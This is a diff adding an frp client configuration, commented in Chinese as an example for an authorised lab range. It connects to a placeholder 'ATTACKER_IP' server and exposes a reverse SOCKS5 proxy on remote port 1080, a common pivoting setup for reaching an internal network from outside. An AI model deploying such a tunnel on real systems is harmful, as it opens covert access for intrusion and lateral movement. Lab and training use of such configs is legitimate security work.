@@ -1,0 +1,12 @@
+# frp 客户端示例（授权靶场）。服务端用 frps，把 token 换成自建值。
+serverAddr = "ATTACKER_IP"
+serverPort = 7000
+auth.method = "token"
+auth.token = "CHANGE_ME"
+
+[[proxies]]
+name = "socks"
+type = "tcp"
+remotePort = 1080
+[proxies.plugin]
+type = "socks5"
